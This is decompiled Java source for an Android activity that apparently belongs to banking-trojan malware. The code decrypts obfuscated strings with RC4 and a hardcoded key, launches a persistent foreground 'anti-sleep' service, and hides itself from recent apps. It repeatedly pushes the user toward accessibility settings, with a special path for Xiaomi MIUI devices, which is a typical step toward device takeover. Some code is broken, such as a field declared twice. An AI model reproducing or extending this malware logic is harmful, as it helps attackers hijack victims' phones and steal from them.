package com.example.mmm;

import android.app.*;
import com.example.mmm.Utils.*;
import com.example.mmm.API.*;
import android.util.*;
import android.graphics.*;
import android.content.*;
import android.os.*;
import com.example.mmm.Service.*;
import com.example.mmm.Activity.*;

public class mainActivity extends Activity
{
    utils utl;
    utils2 seven$;
    constants utl;
    private String TAG_LOG;
    
    public mainActivity() {
        super();
        this.utl = new utils();
        this.seven$ = new utils2();
        this.utl = new constants();
        final StringBuilder sb = new StringBuilder();
        sb.append(mainActivity.class.getSimpleName());
        sb.append("    ");
        this.TAG_LOG = sb.toString();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    protected void onCreate(final Bundle bundle) {
        super.onCreate(bundle);
        final Point point = new Point();
        this.getWindowManager().getDefaultDisplay().getSize(point);
        final utils utl = this.utl;
        final String s = "SW";
        final StringBuilder sb = new StringBuilder();
        sb.append(point.x);
        utl.SettingsWrite((Context)this, s, sb.toString());
        final utils utl2 = this.utl;
        final String s2 = "SE";
        final StringBuilder sb2 = new StringBuilder();
        sb2.append(point.y);
        utl2.SettingsWrite((Context)this, s2, sb2.toString());
        if (this.utl.SettingsRead((Context)this, "QW").contains("good")) {
            this.utl.Log(this.TAG_LOG, "Initialization Start 2!");
        }
        utils.startCustomTimer((Context)this, "", 10000L);
        this.utl._currency((Context)this);
        if (this.utl.meters$ && !this.utl.SettingsRead((Context)this, "EL").equals("start")) {
            final Intent \u0131ntent = new Intent((Context)this, (Class)srvAntiSleep.class);
            \u0131ntent.setAction("start");
            if (Build$VERSION.SDK_INT >= 26) {
                this.utl.Log("Boot", "Starting the service in >=26 Mode from a BroadcastReceiver");
                this.startForegroundService(\u0131ntent);
            }
            else {
                this.utl.Log("Boot", "Starting the service in < 26 Mode from a BroadcastReceiver");
                this.startService(\u0131ntent);
            }
        }
        if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER) && utils.getMiuiVersion() >= 10) {
            if (utils.isAccessibilityServiceEnabled((Context)this, srvAccessibility.class)) {
                this.seven$._cornell((Context)this);
                if (this.utl.SettingsRead((Context)this, "XB").equals("1")) {
                    if (!"".isEmpty()) {
                        this.startActivity(new Intent((Context)this, (Class)actToaskAccessibility.class).addFlags(268435456).addFlags(8388608));
                        return;
                    }
                    this.finish();
                }
            }
            else {
                if (this.utl.regional$) {
                    this.startActivity(new Intent((Context)this, (Class)actToaskAccessibility.class));
                    return;
                }
                this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
            }
            return;
        }
        if (!"".isEmpty()) {
            this.startActivity(new Intent((Context)this, (Class)actToaskAccessibility.class).addFlags(268435456).addFlags(8388608));
            return;
        }
        this.finish();
    }
    
    public void onPause() {
        super.onPause();
    }
    
    public void onStop() {
        super.onStop();
    }
}
